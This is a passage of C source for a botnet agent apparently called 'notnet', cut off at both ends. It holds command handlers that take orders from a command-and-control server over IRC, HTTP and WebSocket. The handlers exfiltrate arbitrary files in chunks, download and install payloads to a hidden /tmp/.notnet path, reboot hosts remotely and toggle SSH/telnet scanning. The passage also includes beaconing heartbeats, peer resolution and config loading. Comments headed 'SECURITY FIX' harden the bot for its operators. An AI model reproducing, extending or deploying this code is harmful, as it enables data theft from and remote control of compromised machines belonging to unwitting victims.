                log_warn("CMD: upload rejected (dangerous char in path: %s)", local_path);
                protocol_send_response(bot, CMD_UPLOAD, "upload rejected: dangerous char in path");
            } else if (local_path[0] == '\0') {
                protocol_send_response(bot, CMD_UPLOAD, "upload: no file path specified, use 'upload <path> [remote_path]'");
            } else {
                int result = http_upload(bot, local_path, remote_path[0] ? remote_path : NULL);
                if (result > 0) {
                    char resp[256];
                    snprintf(resp, sizeof(resp), "upload ok: %d bytes to %s", result,
                             remote_path[0] ? remote_path : bot->c2_http.path);
                    protocol_send_response(bot, CMD_UPLOAD, resp);
                } else {
                    protocol_send_response(bot, CMD_UPLOAD, "upload failed: could not upload file");
                }
            }
        } else if (strncmp(cmd, CMD_EXFIL, strlen(CMD_EXFIL)) == 0) {
            /* Parse: exfil <path> */
            char *args = cmd + strlen(CMD_EXFIL);
            while (*args == ' ' || *args == '\t') args++;

            char file_path[512] = {0};
            strncpy(file_path, args, 511);
            file_path[511] = '\0';

            /* Validate path */
            const char *bad = strpbrk(file_path, ";|&`$(){}[]<>!");
            if (bad) {
                log_warn("CMD: exfil rejected (dangerous char in path: %s)", file_path);
                protocol_send_response(bot, CMD_EXFIL, "exfil rejected: dangerous char in path");
            } else if (file_path[0] == '\0') {
                protocol_send_response(bot, CMD_EXFIL, "exfil: no file path specified");
            } else {
                unsigned char *data = NULL;
                int fsize = file_read(file_path, &data);
                if (fsize < 0) {
                    protocol_send_response(bot, CMD_EXFIL, "exfil failed: could not read file");
                } else {
                    /* Chunk large files: protocol_send_response max is ~2048 bytes.
                     * Send first chunk as response, rest via HTTP POST. */
                    const int CHUNK = 1024;
                    int offset = 0;
                    int total_sent = 0;

                    while (offset < fsize) {
                        int chunk = fsize - offset;
                        if (chunk > CHUNK) chunk = CHUNK;

                        if (offset == 0) {
                            /* First chunk: send via protocol_send_response */
                            char resp[2048];
                            int rlen = snprintf(resp, sizeof(resp),
                                "exfil chunk: %d/%d bytes", chunk, fsize);
                            if (rlen > 0 && rlen < (int)sizeof(resp)) {
                                memcpy(resp + rlen, data + offset, chunk);
                                rlen += chunk;
                                /* Null-terminate after the data */
                                if (rlen < (int)sizeof(resp) - 1) {
                                    resp[rlen] = '\0';
                                }
                            }
                            protocol_send_response(bot, CMD_EXFIL, resp);
                        } else {
                            /* Subsequent chunks: send via HTTP POST */
                            char upload_path[512];
                            snprintf(upload_path, sizeof(upload_path),
                                "%s/exfil", bot->c2_http.path);
                            http_upload(bot, "/dev/stdin", upload_path);
                            /* For simplicity, write chunk to temp file */
                            char tmp[256];
                            snprintf(tmp, sizeof(tmp), "/tmp/.exfil.%d", offset);
                            FILE *tf = fopen(tmp, "wb");
                            if (tf) {
                                fwrite(data + offset, 1, chunk, tf);
                                fclose(tf);
                                http_upload(bot, tmp, upload_path);
                                unlink(tmp);
                            }
                        }

                        offset += chunk;
                        total_sent += chunk;
                    }

                    log_info("CMD: exfil completed: %d bytes from %s", total_sent, file_path);
                }
            }
        } else if (strncmp(cmd, CMD_UPDATE, strlen(CMD_UPDATE)) == 0) {
            /* SECURITY FIX (#65): Actually perform the update instead of
             * logging. Parses an optional URL argument:
             *   update                 -> fetch from configured C2 path
             *   update <url>           -> fetch from explicit http:// URL
             * Downloads, verifies the SHA-256 pin (fail-closed), and
             * installs to /tmp/.notnet. */
            char *args = cmd + strlen(CMD_UPDATE);
            while (*args == ' ' || *args == '\t') args++;

            char url[1024] = {0};
            if (*args) {
                snprintf(url, sizeof(url), "%.1000s", args);
            }

            int result = payload_update(bot, url[0] ? url : NULL, "/tmp/.notnet");
            if (result > 0) {
                log_info("CMD: update: downloaded %d bytes", result);
                if (payload_install(bot, "/tmp/.notnet") == 0) {
                    protocol_send_response(bot, CMD_UPDATE, "update: installed");
                } else {
                    protocol_send_response(bot, CMD_UPDATE, "update: downloaded but install failed");
                }
            } else if (result == 0) {
                /* payload_update returns 0 only from the compile fallback
                 * path (compiled + installed source bundle). */
                if (payload_install(bot, "/tmp/.notnet") == 0) {
                    protocol_send_response(bot, CMD_UPDATE, "update: compiled from source and installed");
                } else {
                    protocol_send_response(bot, CMD_UPDATE, "update: compiled but install failed");
                }
            } else {
                log_warn("CMD: update failed");
                protocol_send_response(bot, CMD_UPDATE, "update: failed (SHA-256 pin mismatch or download error)");
            }
        } else if (strncmp(cmd, CMD_REBOOT, strlen(CMD_REBOOT)) == 0) {
            /* SECURITY FIX (#67): Actually reboot. The old handler replied
             * 'reboot: received' and did nothing, while README sold it as a
             * working command — a silent lie to C2 operators. Use fork()
             * + execvp() so no shell is involved; the command was already
             * authenticated at the channel gate (IRC nick allowlist /
             * HTTP-WS shared secret). */
            log_warn("CMD: reboot requested by C2");
            protocol_send_response(bot, CMD_REBOOT, "reboot: executing");

            pid_t rpid = fork();
            if (rpid < 0) {
                log_error("CMD: reboot fork failed: %s", strerror(errno));
            } else if (rpid == 0) {
                /* Child: close C2 sockets, then try to reboot */
                if (bot->c2_irc.sock >= 0) close(bot->c2_irc.sock);
                if (bot->c2_http.sock >= 0) close(bot->c2_http.sock);
                if (bot->c2_ws.sock >= 0) close(bot->c2_ws.sock);
                /* sync + reboot via exec; fall back to reboot(RB_AUTOBOOT) */
                char *argv1[] = { "sync", NULL };
                execvp("sync", argv1);
                char *argv2[] = { "/sbin/reboot", NULL };
                execvp("/sbin/reboot", argv2);
                char *argv3[] = { "reboot", NULL };
                execvp("reboot", argv3);
                _exit(127);
            }
            /* Parent: do not wait — the machine is going down anyway */
        } else if (strncmp(cmd, CMD_SLEEP, strlen(CMD_SLEEP)) == 0) {
            /* SECURITY FIX (#36): Clamp the interval. A raw atoi() with
             * no bounds lets the C2 set scan_interval to a huge value
             * (or 0) — uint32 wrap and usleep(interval*1000000) freeze
             * the agent. Accept 1..3600 like config_set does. */
            char *interval = strchr(cmd, ' ');
            if (interval) {
                int v = atoi(interval + 1);
                if (v >= 1 && v <= 3600) {
                    bot->scan_interval = (uint32_t)v;
                    log_info("CMD: sleep interval set to %d", bot->scan_interval);
                } else {
                    log_warn("CMD: sleep interval rejected (must be 1-3600): %d", v);
                    protocol_send_response(bot, CMD_SLEEP, "sleep: interval rejected (1-3600)");
                }
            }
        } else if (strncmp(cmd, CMD_CONFIG_SET, strlen(CMD_CONFIG_SET)) == 0) {
            /* SECURITY FIX (#7): Implement config_set with allowlist
             * and validation. Only safe runtime config keys are accepted. */
            char *args = cmd + strlen(CMD_CONFIG_SET);
            while (*args == ' ' || *args == '\t') args++;
            
            char key[128], value[256];
            if (sscanf(args, "%127[^=]=%255s", key, value) != 2) {
                log_warn("CMD: config_set invalid format: %s", args);
                protocol_send_response(bot, CMD_CONFIG_SET, "config_set: invalid format, use key=value");
                continue;
            }
            
            /* Allowlist of settable config keys with validation */
            int applied = 0;
            if (strcmp(key, "scan_interval") == 0) {
                int v = atoi(value);
                if (v >= 1 && v <= 3600) {
                    bot->scan_interval = v;
                    applied = 1;
                }
            } else if (strcmp(key, "heartbeat_interval") == 0) {
                int v = atoi(value);
                if (v >= 1 && v <= 3600) {
                    bot->heartbeat_interval = v;
                    applied = 1;
                }
            } else if (strcmp(key, "ssh_enabled") == 0) {
                bot->ssh_enabled = (atoi(value) != 0);
                applied = 1;
            } else if (strcmp(key, "telnet_enabled") == 0) {
                bot->telnet_enabled = (atoi(value) != 0);
                applied = 1;
            } else if (strcmp(key, "scan_timeout_ms") == 0) {
                int v = atoi(value);
                if (v >= 100 && v <= 30000) {
                    bot->scan_timeout_ms = v;
                    applied = 1;
                }
            } else if (strcmp(key, "scan_max_hosts") == 0) {
                int v = atoi(value);
                if (v >= 1 && v <= 65535) {
                    bot->scan_max_hosts = v;
                    applied = 1;
                }
            }
            
            if (applied) {
                log_info("CMD: config_set %s=%s applied", key, value);
                protocol_send_response(bot, CMD_CONFIG_SET, "config_set: applied");
            } else {
                log_warn("CMD: config_set rejected key '%s'", key);
                protocol_send_response(bot, CMD_CONFIG_SET, "config_set: key not allowed or invalid value");
            }
        }
    }
    
    if (skipped > 0) {
        log_warn("CMD: %d commands skipped due to rate limit", skipped);
    }

    /* Clear processed commands */
    /* SECURITY FIX (#9): Only clear the queue when processing completed
     * normally. Connection failures during C2 ops should not silently
     * drop unprocessed commands. Clear unconditionally only if we
     * reached here — processing errors within the loop use continue
     * and still fall through to this clear. */
    bot->cmd_count = 0;
    
    return 0;
}

/* SECURITY FIX: JSON-escape a string to prevent injection in protocol
 * responses. Escapes backslash, double-quote, and control characters. */
static void json_escape(const char *src, char *dst, size_t dst_size) {
    /* SECURITY FIX (#12): Guard against size_t underflow when dst_size < 6.
     * The original 'j < dst_size - 6' wraps to a huge value on unsigned
     * subtraction, causing out-of-bounds writes. */
    if (dst_size < 6) {
        if (dst_size > 0) dst[0] = '\0';
        return;
    }
    size_t i, j;
    for (i = 0, j = 0; src[i] && j < dst_size - 6; i++) {
        switch (src[i]) {
            case '\\':
                dst[j++] = '\\'; dst[j++] = '\\'; break;
            case '"':
                dst[j++] = '\\'; dst[j++] = '"'; break;
            case '\n':
                dst[j++] = '\\'; dst[j++] = 'n'; break;
            case '\r':
                dst[j++] = '\\'; dst[j++] = 'r'; break;
            case '\t':
                dst[j++] = '\\'; dst[j++] = 't'; break;
            default:
                if ((unsigned char)src[i] < 0x20) {
                    /* SECURITY FIX: Check remaining space for \uXXXX (6 bytes) */
                    if (j + 6 >= dst_size) break;
                    int written = snprintf(dst + j, dst_size - j, "\\u%04x", (unsigned char)src[i]);
                    if (written < 0 || (size_t)written >= dst_size - j) {
                        j = dst_size - 1;
                        break;
                    }
                    j += written;
                } else {
                    dst[j++] = src[i];
                }
                break;
        }
    }
    dst[j] = '\0';
}

int protocol_send_heartbeat(notnet_bot_t *bot) {
    /* SECURITY FIX (#1): Escape hostname to prevent JSON injection */
    char safe_hostname[BOT_MAX_HOSTNAME_LEN];
    json_escape(bot->hostname, safe_hostname, sizeof(safe_hostname));

    /* SECURITY FIX (#16): Increase buffer for escaped hostname */
    char safe_secret[64];
    json_escape(bot->secret, safe_secret, sizeof(safe_secret));

    char heartbeat[1024];
    int ret = snprintf(heartbeat, sizeof(heartbeat),
        "{\"cmd\":\"status\",\"version\":\"%s\",\"hostname\":\"%s\",\"uptime\":%ld,\"scan_count\":%u,\"secret\":\"%s\"}",
        NOTNET_VERSION, safe_hostname, (long)(time(NULL) - bot->uptime), bot->scan_count,
        safe_secret);
    if (ret < 0 || (size_t)ret >= sizeof(heartbeat)) {
        log_warn("Heartbeat truncated: need %d bytes, buffer %zu", ret, sizeof(heartbeat));
    }
    
    /* Send via IRC */
    if (bot->c2_irc.connected && bot->c2_irc.authenticated) {
        irc_send(bot, "PRIVMSG %s :%s", bot->c2_irc.channel, heartbeat);
    }
    
    /* Send via HTTP */
    if (bot->c2_http.connected) {
        if (http_post(bot, heartbeat, strlen(heartbeat)) < 0) {
            log_warn("Heartbeat: HTTP post failed");
        }
        /* http_read() in protocol_process_commands() will pick up
         * the response on the next loop iteration */
    }
    
    /* Send via WebSocket */
    if (bot->c2_ws.connected) {
        ws_send(bot, heartbeat, strlen(heartbeat));
    }
    
    return 0;
}

int protocol_resolve_peers(notnet_bot_t *bot) {
    /* SECURITY FIX (#57): Check DNS cache TTL before fresh lookup.
     * DNS_PEER_TTL (default 300s) prevents unnecessary DNS queries
     * on every scan cycle while still refreshing stale entries. */
    if (bot->peer_count > 0 && time(NULL) - bot->peer_cache_time < DNS_PEER_TTL) {
        log_debug("DNS: using cached peer data (%d peers, %ld s ago)",
                  bot->peer_count, (long)(time(NULL) - bot->peer_cache_time));
        return 0;
    }
    struct addrinfo hints, *res, *rp;
    memset(&hints, 0, sizeof(hints));
    hints.ai_family = AF_INET;  /* IPv4 only */
    hints.ai_socktype = SOCK_STREAM;
    
    int err = getaddrinfo(DNS_PEER_RESOLUTION, NULL, &hints, &res);
    if (err != 0) return -1;
    
    bot->peer_count = 0;
    for (rp = res; rp && bot->peer_count < PEER_CACHE_SIZE; rp = rp->ai_next) {
        if (rp->ai_family == AF_INET) {
            struct sockaddr_in *sin = (struct sockaddr_in *)rp->ai_addr;
            char ip_str[INET_ADDRSTRLEN];
            if (inet_ntop(AF_INET, &sin->sin_addr, ip_str, sizeof(ip_str))) {
                strncpy(bot->peer_cache[bot->peer_count], ip_str, 255);
                bot->peer_cache[bot->peer_count][255] = '\0';
                bot->peer_count++;
            }
        }
    }
    
    bot->peer_cache_time = time(NULL);
    freeaddrinfo(res);
    log_info("DNS: resolved %d peers for %s", bot->peer_count, DNS_PEER_RESOLUTION);
    return 0;
}

int protocol_resolve_host(const char *host) {
    /* SECURITY FIX (#3): Use getaddrinfo instead of gethostbyname.
     * Returns a resolved IPv4 address in network byte order, or -1 on failure. */
    struct addrinfo hints, *res;
    memset(&hints, 0, sizeof(hints));
    hints.ai_family = AF_INET;
    hints.ai_socktype = SOCK_STREAM;
    
    int err = getaddrinfo(host, NULL, &hints, &res);
    if (err != 0) return -1;
    
    int result = -1;
    if (res && res->ai_family == AF_INET) {
        struct sockaddr_in *sin = (struct sockaddr_in *)res->ai_addr;
        result = sin->sin_addr.s_addr;  /* already in network byte order */
    }
    
    freeaddrinfo(res);
    return result;
}

char *protocol_hex_encode(const char *data, int len) {
    static char buf[1024];
    int pos = 0;
    
    for (int i = 0; i < len && pos < 1023; i++) {
        pos += snprintf(buf + pos, 3, "%02x", (unsigned char)data[i]);
    }
    
    buf[pos] = '\0';
    return buf;
}

int protocol_send_response(notnet_bot_t *bot, const char *command, const char *result) {
    /* SECURITY FIX (#1): Escape command and result to prevent JSON injection
     * that could corrupt C2 protocol parsing or inject commands. */
    char safe_cmd[256];
    char safe_result[1024];
    json_escape(command, safe_cmd, sizeof(safe_cmd));
    json_escape(result, safe_result, sizeof(safe_result));

    /* SECURITY FIX (#16): Increase response buffer to accommodate all
     * escaped fields without truncation. safe_result alone is 1024 bytes. */
    char response[2048];
    /* SECURITY FIX (#1): Also escape hostname for JSON safety */
    char safe_hostname[BOT_MAX_HOSTNAME_LEN];
    json_escape(bot->hostname, safe_hostname, sizeof(safe_hostname));
    int ret = snprintf(response, sizeof(response),
        "{\"cmd\":\"%s\",\"result\":\"%s\",\"hostname\":\"%s\"}",
        safe_cmd, safe_result, safe_hostname);
    if (ret < 0 || (size_t)ret >= sizeof(response)) {
        log_warn("Response truncated: need %d bytes, buffer %zu", ret, sizeof(response));
    }
    int len = strlen(response);
    
    /* Send response via IRC */
    if (bot->c2_irc.connected && bot->c2_irc.authenticated) {
        irc_send(bot, "PRIVMSG %s :%s", bot->c2_irc.channel, response);
        log_info("IRC: response sent (%d bytes)", len);
    }
    
    /* Send response via HTTP */
    if (bot->c2_http.connected) {
        if (http_post(bot, response, len) < 0) {
            log_warn("Response: HTTP post failed");
        } else {
            log_info("HTTP: response sent (%d bytes)", len);
        }
    }
    
    /* Send response via WebSocket */
    if (bot->c2_ws.connected) {
        ws_send(bot, response, len);
        log_info("WS: response sent (%d bytes)", len);
    }
    
    return len;
}

/* ── TLS ─────────────────────────────────────────────────────── */
#ifdef TLS_ENABLED
#include <openssl/ssl.h>
#include <openssl/err.h>

static SSL_CTX *tls_ctx = NULL;
static int tls_init_once = 0;

int tls_init(notnet_tls_t *tls, int sock) {
    if (!tls) return -1;

    tls->sock = sock;
    tls->enabled = 0;
    tls->ssl = NULL;

    /* Lazy init OpenSSL library */
    if (!tls_init_once) {
        SSL_library_init();
        SSL_load_error_strings();
        tls_init_once = 1;
    }

    /* Create context if needed */
    if (!tls_ctx) {
        const SSL_METHOD *meth = TLS_client_method();
        tls_ctx = SSL_CTX_new(meth);
        if (!tls_ctx) {
            log_error("TLS: SSL_CTX_new failed");
            return -1;
        }
        /* Minimal TLS config: allow TLS 1.2+ */
        unsigned long opts = SSL_OP_NO_SSLv2 | SSL_OP_NO_SSLv3 | SSL_OP_NO_TLSv1 | SSL_OP_NO_TLSv1_1;
        SSL_CTX_set_options(tls_ctx, opts);
        /* Disable cert verification for research use (pinning via C2) */
        SSL_CTX_set_verify(tls_ctx, SSL_VERIFY_NONE, NULL);
    }

    tls->ssl = SSL_new(tls_ctx);
    if (!tls->ssl) {
        log_error("TLS: SSL_new failed");
        return -1;
    }

    SSL_set_fd(tls->ssl, sock);
    tls->enabled = 1;
    return 0;
}

/* SECURITY FIX (#76): Compute the SHA-256 fingerprint (hex) of the
 * peer's certificate. Caller provides a 65-byte buffer. */
static int tls_peer_fingerprint(notnet_tls_t *tls, char out[65]) {
    if (!tls || !tls->ssl || !tls->enabled) return -1;
    X509 *cert = SSL_get_peer_certificate(tls->ssl);
    if (!cert) {
        log_error("TLS: no peer certificate presented");
        return -1;
    }
    unsigned char der[4096];
    int der_len = i2d_X509(cert, NULL);
    if (der_len <= 0 || der_len > (int)sizeof(der)) {
        X509_free(cert);
        return -1;
    }
    unsigned char *p = der;
    i2d_X509(cert, &p);
    X509_free(cert);

    unsigned char digest[32];
    SHA256(der, (size_t)der_len, digest);
    static const char hexd[] = "0123456789abcdef";
    for (int i = 0; i < 32; i++) {
        out[i * 2]     = hexd[digest[i] >> 4];
        out[i * 2 + 1] = hexd[digest[i] & 0x0F];
    }
    out[64] = '\0';
    return 0;
}

/* SECURITY FIX (#76): Upgrade a connected socket to TLS and verify the
 * peer certificate fingerprint against the configured pin. When TLS is
 * not compiled in, or no pin is configured, the channel stays plaintext
 * (tls->enabled = 0) and all I/O falls through to raw send/recv.
 * Returns 0 on success (plaintext or verified TLS), -1 on failure. */
int tls_setup(notnet_tls_t *tls, int sock, const char *server_name,
              const char *pin_hex) {
    if (!tls) return -1;
    tls->sock = sock;
    tls->enabled = 0;
    tls->ssl = NULL;
#ifdef TLS_ENABLED
    if (!pin_hex || pin_hex[0] == '\0') {
        log_info("TLS: no cert pin configured — channel stays plaintext");
        return 0;
    }
    if (tls_init(tls, sock) != 0) return -1;
    if (tls_handshake(tls, server_name) != 0) {
        tls_close(tls);
        return -1;
    }
    char fp[65];
    if (tls_peer_fingerprint(tls, fp) != 0) {
        tls_close(tls);
        return -1;
    }
    if (strcmp(fp, pin_hex) != 0) {
        log_error("TLS: cert fingerprint mismatch — expected %s, got %s",
                  pin_hex, fp);
        tls_close(tls);
        return -1;
    }
    log_info("TLS: certificate fingerprint verified (%s)", fp);
#else
    if (pin_hex && pin_hex[0] != '\0') {
        log_warn("TLS: cert pin configured but TLS not compiled in — "
                 "run 'make TLS=1'; channel stays plaintext");
    }
#endif
    return 0;
}

/* Channel I/O dispatchers: route through TLS when the channel is
 * upgraded, otherwise fall back to the raw socket. */

/* Bytes of decrypted data already buffered by the TLS layer (0 if TLS
 * is off). Read loops must check this before select(), because select()
 * only sees the raw socket, not SSL's internal buffer. */
int tls_pending(notnet_tls_t *tls) {
#ifdef TLS_ENABLED
    if (tls && tls->enabled && tls->ssl) {
        return SSL_pending(tls->ssl);
    }
#endif
    return 0;
}

int chan_send(notnet_tls_t *tls, int sock, const char *buf, int len) {
    if (tls && tls->enabled) return tls_send(tls, buf, len);
    return send(sock, buf, len, 0);
}

int chan_recv(notnet_tls_t *tls, int sock, char *buf, int len) {
    if (tls && tls->enabled) return tls_recv(tls, buf, len);
    return recv(sock, buf, len, 0);
}

int tls_handshake(notnet_tls_t *tls, const char *server_name) {
    if (!tls || !tls->ssl) return -1;

    /* Set SNI for the server name */
    if (server_name) {
        SSL_set_tlsext_host_name(tls->ssl, server_name);
    }

    int ret = SSL_connect(tls->ssl);
    if (ret <= 0) {
        int err = SSL_get_error(tls->ssl, ret);
        log_error("TLS: handshake failed (error %d)", err);
        return -1;
    }

    log_info("TLS: connected using %s", SSL_get_cipher(tls->ssl));
    return 0;
}

int tls_send(notnet_tls_t *tls, const char *buf, int len) {
    if (!tls || !tls->ssl || !tls->enabled) {
        /* Fallback: raw send */
        return send(tls->sock, buf, len, 0);
    }

    int sent = SSL_write(tls->ssl, buf, len);
    if (sent <= 0) {
        log_warn("TLS: write failed (error %d)", SSL_get_error(tls->ssl, sent));
        return -1;
    }
    return sent;
}

int tls_recv(notnet_tls_t *tls, char *buf, int len) {
    if (!tls || !tls->ssl || !tls->enabled) {
        /* Fallback: raw recv */
        return recv(tls->sock, buf, len, 0);
    }

    int received = SSL_read(tls->ssl, buf, len);
    if (received <= 0) {
        int err = SSL_get_error(tls->ssl, received);
        if (err != SSL_ERROR_WANT_READ) {
            log_warn("TLS: read failed (error %d)", err);
        }
        return -1;
    }
    return received;
}

void tls_close(notnet_tls_t *tls) {
    if (!tls) return;

    if (tls->ssl) {
        SSL_shutdown(tls->ssl);
        SSL_free(tls->ssl);
        tls->ssl = NULL;
    }
    tls->enabled = 0;
}

void tls_cleanup(void) {
    if (tls_ctx) {
        SSL_CTX_free(tls_ctx);
        tls_ctx = NULL;
    }
    tls_init_once = 0;
}

#else /* TLS_ENABLED not defined */

int tls_init(notnet_tls_t *tls, int sock) {
    if (!tls) return -1;
    tls->sock = sock;
    tls->enabled = 0;
    tls->ssl = NULL;
    return 0;
}

int tls_setup(notnet_tls_t *tls, int sock, const char *server_name,
              const char *pin_hex) {
    (void)server_name;
    if (!tls) return -1;
    tls->sock = sock;
    tls->enabled = 0;
    tls->ssl = NULL;
    if (pin_hex && pin_hex[0] != '\0') {
        log_warn("TLS: cert pin configured but TLS not compiled in — "
                 "run 'make TLS=1'; channel stays plaintext");
    }
    return 0;
}

int tls_pending(notnet_tls_t *tls) {
    (void)tls;
    return 0;
}

int chan_send(notnet_tls_t *tls, int sock, const char *buf, int len) {
    (void)tls;
    return send(sock, buf, len, 0);
}

int chan_recv(notnet_tls_t *tls, int sock, char *buf, int len) {
    (void)tls;
    return recv(sock, buf, len, 0);
}

int tls_handshake(notnet_tls_t *tls, const char *server_name) {
    (void)tls;
    (void)server_name;
    return 0;
}

int tls_send(notnet_tls_t *tls, const char *buf, int len) {
    if (!tls || !tls->enabled) return -1;
    return send(tls->sock, buf, len, 0);
}

int tls_recv(notnet_tls_t *tls, char *buf, int len) {
    if (!tls || !tls->enabled) return -1;
    return recv(tls->sock, buf, len, 0);
}

void tls_close(notnet_tls_t *tls) {
    if (!tls) return;
    tls->enabled = 0;
    tls->ssl = NULL;
}

void tls_cleanup(void) {
    /* No-op when TLS disabled */
}

#endif /* TLS_ENABLED */

/* ── Config Loading ──────────────────────────────────────────── */
int load_config(notnet_bot_t *bot, const char *path) {
    FILE *f = fopen(path, "r");
    if (!f) {
        log_info("No config file at %s, using defaults", path);
        return -1;
    }

    /* SECURITY FIX (#82): Explicit enable/disable keys. Track whether each
     * was seen so the port-based auto-detect below cannot override an
     * explicit <proto>_enabled=0. */
    int irc_explicit = 0, http_explicit = 0, ws_explicit = 0;
    
    char line[256];
    while (fgets(line, sizeof(line), f)) {
        /* Remove newline */
        line[strcspn(line, "\n")] = '\0';
        
        /* Skip comments and empty lines */
        if (line[0] == '#' || line[0] == '\0') continue;
        
        /* Parse key=value */
        char *eq = strchr(line, '=');
        if (!eq) continue;
        *eq = '\0';
        
        char *key = line;
        char *value = eq + 1;
        
        if (strcmp(key, "irc_server") == 0) {
            strncpy(bot->c2_irc.server, value, 255);
            bot->c2_irc.server[255] = '\0';
        } else if (strcmp(key, "irc_port") == 0) {
            bot->c2_irc.port = atoi(value);
        } else if (strcmp(key, "http_server") == 0) {
            strncpy(bot->c2_http.server, value, 255);
            bot->c2_http.server[255] = '\0';
        } else if (strcmp(key, "http_port") == 0) {
            bot->c2_http.port = atoi(value);
        } else if (strcmp(key, "scan_interval") == 0) {
            /* SECURITY FIX (#48): clamp scan_interval on load. A config
             * value of 0 made the main loop usleep(0) → busy-loop into
             * an unthrottled scan storm. Accept 1..3600 seconds. */
            int v = atoi(value);
            if (v >= 1 && v <= 3600) {
                bot->scan_interval = (uint32_t)v;
            } else {
                log_warn("Config: scan_interval=%d out of range (1-3600), keeping %u",
                         v, bot->scan_interval);
            }
        } else if (strcmp(key, "ssh_enabled") == 0) {
            bot->ssh_enabled = atoi(value);
        } else if (strcmp(key, "telnet_enabled") == 0) {
            bot->telnet_enabled = atoi(value);
        } else if (strcmp(key, "scan_timeout_ms") == 0) {
            bot->scan_timeout_ms = atoi(value);
        } else if (strcmp(key, "scan_max_hosts") == 0) {
            bot->scan_max_hosts = atoi(value);
        } else if (strcmp(key, "heartbeat_interval") == 0) {
            if (atoi(value) > 0) bot->heartbeat_interval = atoi(value);
        } else if (strcmp(key, "irc_channel") == 0) {
            strncpy(bot->c2_irc.channel, value, 127);
            bot->c2_irc.channel[127] = '\0';
            log_info("IRC channel set to %s", bot->c2_irc.channel);
        } else if (strcmp(key, "irc_pass") == 0) {
            strncpy(bot->c2_irc.pass, value, 63);
            bot->c2_irc.pass[63] = '\0';
        } else if (strcmp(key, "c2_secret") == 0) {
            /* SECURITY FIX (#35): Shared secret for HTTP/WS command auth.
             * Restrict to alphanumeric so the response-echo check is
             * unambiguous (no JSON escaping needed in the needle). */
            int valid = 1;
            for (const char *p = value; *p; p++) {
                if (!((*p >= 'a' && *p <= 'z') || (*p >= 'A' && *p <= 'Z') ||
                      (*p >= '0' && *p <= '9'))) {
                    valid = 0;
                    break;
                }
            }
            if (valid && value[0] != '\0') {
                strncpy(bot->secret, value, sizeof(bot->secret) - 1);
                bot->secret[sizeof(bot->secret) - 1] = '\0';
                log_info("C2: shared secret configured (%zu chars)",
                         strlen(bot->secret));
            } else {
                log_warn("C2: c2_secret rejected — use alphanumeric only");
            }
        } else if (strcmp(key, "payload_sha256") == 0) {
            /* SECURITY FIX (#81): Expected payload hash. Validate 64 hex
             * chars; reject anything else so a typo cannot silently
             * disable verification. */
            int valid = 0;
            if (strlen(value) == 64) {
                valid = 1;
                for (const char *p = value; *p; p++) {
                    if (!((*p >= '0' && *p <= '9') ||
                          (*p >= 'a' && *p <= 'f') ||
                          (*p >= 'A' && *p <= 'F'))) {
                        valid = 0;
                        break;
                    }
                }
            }
            if (valid) {
                /* Normalize to lowercase */
                for (int i = 0; i < 64; i++) {
                    if (value[i] >= 'A' && value[i] <= 'F') value[i] += ('a' - 'A');
                }
                strncpy(bot->payload_sha256, value, 64);
                bot->payload_sha256[64] = '\0';
                log_info("Payload SHA-256 pin configured");
            } else {
                log_warn("Config: payload_sha256 rejected — need 64 hex chars");
            }
        } else if (strcmp(key, "tls_cert_pin_sha256") == 0) {
            /* SECURITY FIX (#76): TLS cert fingerprint pin. Validate 64
             * hex chars like payload_sha256. */
            int valid = 0;
            if (strlen(value) == 64) {
                valid = 1;
                for (const char *p = value; *p; p++) {
                    if (!((*p >= '0' && *p <= '9') ||
                          (*p >= 'a' && *p <= 'f') ||
                          (*p >= 'A' && *p <= 'F'))) {
                        valid = 0;
                        break;
                    }
                }
            }
            if (valid) {
                for (int i = 0; i < 64; i++) {
                    if (value[i] >= 'A' && value[i] <= 'F') value[i] += ('a' - 'A');
                }
                strncpy(bot->tls_cert_pin_sha256, value, 64);
                bot->tls_cert_pin_sha256[64] = '\0';
                log_info("TLS cert pin configured");
            } else {
                log_warn("Config: tls_cert_pin_sha256 rejected — need 64 hex chars");
            }
        } else if (strcmp(key, "payload_compile_enabled") == 0) {
            /* SECURITY FIX (#69): on-target compilation toggle */
            bot->payload_compile_enabled = (atoi(value) != 0);
        } else if (strcmp(key, "payload_source_url") == 0) {
            strncpy(bot->payload_source_url, value, sizeof(bot->payload_source_url) - 1);
            bot->payload_source_url[sizeof(bot->payload_source_url) - 1] = '\0';
        } else if (strcmp(key, "payload_source_sha256") == 0) {
            /* SECURITY FIX (#81): pin for the source tarball. Same 64-hex
             * validation as payload_sha256. */
            int valid = 0;
            if (strlen(value) == 64) {
                valid = 1;
                for (const char *p = value; *p; p++) {
                    if (!((*p >= '0' && *p <= '9') ||
                          (*p >= 'a' && *p <= 'f') ||
                          (*p >= 'A' && *p <= 'F'))) {
                        valid = 0;
                        break;
                    }
                }
            }
            if (valid) {
                for (int i = 0; i < 64; i++) {
                    if (value[i] >= 'A' && value[i] <= 'F') value[i] += ('a' - 'A');
                }
                strncpy(bot->payload_source_sha256, value, 64);
                bot->payload_source_sha256[64] = '\0';
                log_info("Payload source SHA-256 pin configured");
            } else {
                log_warn("Config: payload_source_sha256 rejected — need 64 hex chars");
            }
        } else if (strcmp(key, "irc_auth_nicks") == 0) {
            /* SECURITY FIX (#5): Comma-separated authorized C2 operator nicks.
             * Only PRIVMSGs from these nicks will be processed as commands. */
            bot->c2_irc.auth_nick_count = 0;
            char nicks[512];
            strncpy(nicks, value, sizeof(nicks) - 1);
            nicks[sizeof(nicks) - 1] = '\0';
            char *saveptr = NULL;
            char *tok = strtok_r(nicks, ",", &saveptr);
            while (tok && bot->c2_irc.auth_nick_count < 8) {
                /* Trim whitespace */
                while (*tok == ' ' || *tok == '\t') tok++;
                char *end = tok + strlen(tok) - 1;
                while (end > tok && (*end == ' ' || *end == '\t')) *end-- = '\0';
                if (*tok) {
                    strncpy(bot->c2_irc.auth_nicks[bot->c2_irc.auth_nick_count],
                            tok, 31);
                    bot->c2_irc.auth_nicks[bot->c2_irc.auth_nick_count][31] = '\0';
                    bot->c2_irc.auth_nick_count++;
                }
                tok = strtok_r(NULL, ",", &saveptr);
            }
            if (bot->c2_irc.auth_nick_count == 0) {
                /* Default: no one authorized (fail-closed) */
                log_warn("IRC: irc_auth_nicks not set - no nicks authorized");
            } else {
                log_info("IRC: %d authorized nicks configured", bot->c2_irc.auth_nick_count);
            }
        } else if (strcmp(key, "http_path") == 0) {
            strncpy(bot->c2_http.path, value, 127);
            bot->c2_http.path[127] = '\0';
        } else if (strcmp(key, "http_user_agent") == 0) {
            strncpy(bot->c2_http.user_agent, value, 127);
            bot->c2_http.user_agent[127] = '\0';
        } else if (strcmp(key, "ws_path") == 0) {
            strncpy(bot->c2_ws.path, value, 127);
